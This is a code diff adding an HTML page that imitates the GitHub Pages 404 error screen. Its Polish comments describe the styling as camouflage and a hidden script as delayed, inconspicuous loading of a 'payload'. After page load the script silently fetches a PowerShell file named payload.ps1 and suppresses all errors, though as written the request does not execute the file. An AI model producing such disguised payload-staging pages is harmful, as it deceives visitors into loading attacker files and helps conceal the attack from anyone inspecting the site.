@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 - Not Found - GitHub Pages</title>
+    <!-- Styl GitHub Pages dla lepszego kamuflażu -->
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; font-size: 16px; line-height: 1.5; color: #24292e; background-color: #fff; max-width: 1012px; margin: 0 auto; padding: 32px; }
+        .container { margin-top: 64px; text-align: center; }
+        h1 { font-size: 32px; font-weight: 600; margin-bottom: 8px; }
+        p { font-size: 16px; margin-bottom: 16px; }
+        .logo { color: #0366d6; text-decoration: none; font-weight: 600; }
+        hr { margin: 32px 0; border: 0; border-top: 1px solid #eaecef; }
+    </style>
+    <!-- Bezpieczne, opóźnione ładowanie payloadu -->
+    <script>
+        // Czekaj aż strona się w pełni załaduje, aby nie wstrzymywać renderowania
+        window.addEventListener('load', function() {
+            // Dodatkowe opóźnienie dla niepozorności
+            setTimeout(function() {
+                // Użyj Fetch API zamiast iframe - jest mniej rzucające się w oczy
+                fetch('payload.ps1', {
+                    method: 'GET',
+                    mode: 'no-cors', // Tryb no-cors unika wymagania CORS
+                    cache: 'no-store' // Nie cache'uj żądania
+                })
+                .catch(function(error) {
+                    // Celowo puste - errors są oczekiwane i ignorowane
+                });
+            }, 1500); // Opóźnienie 1.5 sekundy
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>404</h1>
+        <p><strong>File not found</strong></p>
+        <p>The site configured at this address does not contain the requested file.</p>
+        <p>If this is your site, make sure that the filename case matches the URL.<br>
+        For root URLs (like <code>http://example.com/</code>) you must provide an <code>index.html</code> file.</p>
+        <hr>
+        <p><a href="https://pages.github.com/" class="logo">GitHub Pages</a></p>
+    </div>
+</body>
+</html>
